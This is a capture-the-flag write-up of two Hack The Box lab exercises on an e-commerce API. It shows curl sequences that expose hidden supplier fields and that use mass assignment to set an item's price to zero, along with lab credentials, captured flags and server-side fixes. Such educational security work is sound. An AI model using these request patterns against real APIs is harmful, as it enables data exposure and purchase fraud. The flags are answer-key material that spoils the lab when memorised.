# BOPLA — Exercise Writeups (Excessive Data Exposure + Mass Assignment)

## Exercise 1 — Excessive Data Exposure

### Challenge
Exploit an Excessive Data Exposure vulnerability using `htbpentester5@hackthebox.com:HTBPentester5`.

**Target:** `154.57.164.82:31176`

### Vulnerability
CWE-213 — The `/api/v1/supplier-companies` endpoint returns sensitive internal fields to a customer who should only see company names.

### Procedure
```bash
JWT5=$(curl -s -X POST 'http://154.57.164.82:31176/api/v1/authentication/customers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"htbpentester5@hackthebox.com","Password":"HTBPentester5"}' | jq -r '.jwt')

curl -s 'http://154.57.164.82:31176/api/v1/supplier-companies' \
  -H "Authorization: Bearer $JWT5" | jq
```

The response exposed: `email`, `isExemptedFromMarketplaceFee`, `certificateOfIncorporationPDFFileURI`.
The `HTB Academy` company's `email` field contained the flag.

### Flag
HTB{d759c70b5a9f6a392af78cc1eca9cdf0}

### Fix
Return a public DTO with only `id` and `name`. Never expose the full domain entity at an API boundary.

---

## Exercise 2 — Mass Assignment

### Challenge
Exploit a Mass Assignment vulnerability using `htbpentester7@hackthebox.com:HTBPentester7`.

**Target:** `154.57.164.82:31176`

### Vulnerability
CWE-915 — The `POST /api/v1/customers/orders/items` endpoint accepts a `NetSum` field, letting the customer set their own item price instead of having the server compute it.

### Procedure
```bash
JWT7=$(curl -s -X POST 'http://154.57.164.82:31176/api/v1/authentication/customers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"htbpentester7@hackthebox.com","Password":"HTBPentester7"}' | jq -r '.jwt')

# Step 1 — create order
ORDER_ID=$(curl -s -X POST 'http://154.57.164.82:31176/api/v1/customers/orders' \
  -H "Authorization: Bearer $JWT7" \
  -H 'Content-Type: application/json' \
  -d '{"Date":"2024-01-01","status":"Completed","isPaid":true,"totalPrice":0}' | jq -r '.id')

# Step 2 — get a valid product ID (Smart Home Hub, price: $25.50)
PRODUCT_ID=$(curl -s 'http://154.57.164.82:31176/api/v1/products' \
  -H "Authorization: Bearer $JWT7" | jq -r '.products[0].id')

# Step 3 — buy $25.50 product for free via NetSum: 0
curl -s -X POST 'http://154.57.164.82:31176/api/v1/customers/orders/items' \
  -H "Authorization: Bearer $JWT7" \
  -H 'Content-Type: application/json' \
  -d "{\"OrderID\":\"$ORDER_ID\",\"OrderItems\":[{\"ProductID\":\"$PRODUCT_ID\",\"Quantity\":1,\"NetSum\":0}]}" | jq
```

Response: `{"SuccessStatus": true, "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"}`

### Flag
HTB{4d86794f82046e465ca29d91bdbe5bca}

### Fix
Remove `NetSum` from the request DTO entirely. Price must be computed server-side:
`price = product.price × quantity` — never accepted from the client.
